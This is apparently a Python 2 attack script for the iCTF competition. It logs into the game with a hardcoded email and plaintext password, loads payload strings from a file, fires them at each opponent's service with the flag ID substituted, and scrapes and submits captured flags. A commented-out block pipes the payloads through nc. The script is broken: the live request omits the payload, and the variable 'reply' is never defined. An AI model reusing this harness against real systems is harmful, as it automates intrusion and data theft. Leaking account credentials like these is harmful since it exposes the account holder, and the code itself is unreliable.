#!/bin/env python

import os
import re
import time
import requests
import subprocess32
from ictf import iCTF
from scapy.all import *

i = iCTF("http://35.167.152.77/")
t = i.login("evanxia1018@gmail.com","B3Uy3rYgqza8")


t.get_service_list()

AD = open("AD.txt", 'r')
strings = AD.readlines()
AD.close()

host = ""
flagid = ""
port = ""
new = ''

for l in t.get_service_list():
    print "=========="
    for k, v in l.iteritems():
        print k, ": ", v
        if k == "service_id":
            for n in t.get_targets(v)['targets']:
                #print "    ", n
                for p, q in n.iteritems():
                    print "    ", p, ": ", q
                    if p == "hostname":
                        host = q
                    if p == "flag_id":
                        flagid = q
                    if p == "port":
                        port = q
                toolong = False
                for s in strings:
                    s = s.replace('<<<>>>', flagid)
                    print s
                    try:
                        # out = subprocess32.Popen(
                                # 'perl -e \'print"' + s + '"\'',
                                # shell=True, stdout=subprocess32.PIPE
                                # )
                        # reply = subprocess32.check_output(["nc", host, str(port)], timeout=2, stdin=out.stdout)
                        para = {}
                        requests.get('http://' + host + ':' + port, timeout=0.8, params = para)
                    except requests.exceptions.Timeout:
                        toolong = True
                        break
                if toolong:
                    continue

                print '+++++++++++++++'
                flagfound = False
                for got in  reply.splitlines():
                    print got
                    m = re.search(r'(FLG\w{13})', got)
                    if m:
                        print "Captured FLAG: " + m.group(1)
                        print "Submitting: ",
                        print t.submit_flag([m.group(1)])
                        flagfound = True
                print '+++++++++++++++'
                if flagfound:
                    continue